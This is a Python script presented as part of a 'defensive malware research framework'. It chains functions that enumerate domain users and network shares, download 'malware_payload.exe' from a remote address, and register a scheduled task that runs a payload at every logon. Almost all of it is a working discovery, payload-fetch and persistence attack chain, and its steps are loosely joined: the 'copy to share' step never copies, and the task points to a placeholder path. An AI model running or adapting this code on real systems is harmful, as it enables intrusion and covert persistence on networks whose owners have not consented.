#!/usr/bin/env python3
"""Merged modules for a defensive malware research framework."""
import sys
import json
import time
import subprocess
import os
from typing import Dict, Any
import requests

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    """Enumerate Domain Users using Windows API calls"""
    start = time.time()
    input_data = input_data or {}
    result = {'users': []}
    
    try:
        # Use 'net user /domain' to list domain users
        completed_process = subprocess.run(
            ['net', 'user', '/domain'],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        if completed_process.returncode == 0:
            # Parse the output to extract user names
            output_lines = completed_process.stdout.splitlines()
            users = []
            capture = False
            for line in output_lines:
                if '-----' in line:
                    capture = not capture
                    continue
                if capture:
                    users.extend(line.split())
            result['users'] = users
        else:
            # If the command fails, return an empty list
            result['users'] = []

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    """Enumerate Shared Network Drives"""
    start = time.time()
    input_data = input_data or {}
    try:
        # Attempt to enumerate shared network drives using 'net use'
        result = subprocess.run(['net', 'use'], capture_output=True, text=True, timeout=10)
        shares = []

        if result.returncode == 0:
            # Parse the output to find shared network drives
            for line in result.stdout.splitlines():
                if line.startswith('OK'):
                    parts = line.split()
                    if len(parts) > 1:
                        shares.append(parts[1])  # Assuming the share path is the second element
        else:
            shares = []

        return {'success': True, 'data': {'shares': shares},
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'shares': []}, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    """Copy Malware Payload to Remote Share"""
    start = time.time()
    input_data = input_data or {}
    try:
        shares = input_data.get('shares', [])
        url = "https://192.168.1.100/payload"
        local_filename = "malware_payload.exe"
        success = False

        # Attempt to download the payload
        response = requests.get(url, stream=True, timeout=30)
        if response.status_code == 200:
            with open(local_filename, 'wb') as f:
                for chunk in response.iter_content(8192):
                    f.write(chunk)

            # Verify file exists and size > 0
            if os.path.exists(local_filename) and os.path.getsize(local_filename) > 0:
                success = True

        return {'success': success,
                'data': {},
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    """Create Scheduled Task to Execute Payload"""
    start = time.time()
    input_data = input_data or {}
    task_created = False
    try:
        # Check if the previous task was successful
        if input_data.get('success', False):
            # Define the task name and the path to the payload
            task_name = "MalwarePayloadTask"
            payload_path = "C:\\Path\\To\\Malware\\payload.exe"  # Replace with actual payload path

            # Create a scheduled task to execute the payload on logon
            result = subprocess.run(
                ['schtasks', '/create', '/tn', task_name, '/tr', payload_path, '/sc', 'onlogon', '/f'],
                capture_output=True, text=True
            )

            # Check if the task was created successfully
            if result.returncode == 0:
                task_created = True
            else:
                # Log the failure for debugging purposes
                print(f"Failed to create scheduled task: {result.stderr}")

        return {'success': True, 'data': {'task_created': task_created},
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Enumerate Domain Users [discovery] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Enumerate Domain Users): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Enumerate Domain Users): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Enumerate Shared Network Drives [discovery] ──
    try:
        r = task_T2(None)
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Enumerate Shared Network Drives): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Enumerate Shared Network Drives): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Copy Malware Payload to Remote Share [execution] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Copy Malware Payload to Remote Share): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Copy Malware Payload to Remote Share): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    # ── T4: Create Scheduled Task to Execute Payload [persistence] ──
    try:
        r = task_T4(outputs.get('T3', {}))
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Create Scheduled Task to Execute Payload): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Create Scheduled Task to Execute Payload): FAILED — {err}')
            failed.append('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))